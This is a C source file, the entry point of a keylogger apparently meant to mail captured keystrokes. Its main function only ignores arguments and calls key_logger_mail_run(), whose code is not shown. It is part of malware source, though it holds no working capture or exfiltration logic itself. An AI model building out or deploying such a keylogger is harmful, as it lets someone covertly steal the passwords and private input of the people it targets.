/******************************************************************************************************
 * @file key_logger_mail_main.c                                                                       *
 * @date:      @author:                   Reason for change:                                          *
 * 08.08.2023  Gaina Stefan               Initial version.                                            *
 * @details This file provides an entry point for the keylogger.                                      *
 * @todo N/A.                                                                                         *
 * @bug No known bugs.                                                                                *
 *****************************************************************************************************/

/******************************************************************************************************
 * HEADER FILE INCLUDES                                                                               *
 *****************************************************************************************************/

#include <stdio.h>
#include <stdlib.h>

#include "key_logger_mail.h"

/******************************************************************************************************
 * ENTRY POINT                                                                                        *
 *****************************************************************************************************/

int main(int argc, char* argv[])
{
	if (2L <= argc)
	{
		(void)fprintf(stdout, "Parameters will be ignored!\n");
	}

	return false == key_logger_mail_run() ? EXIT_FAILURE : EXIT_SUCCESS;
}
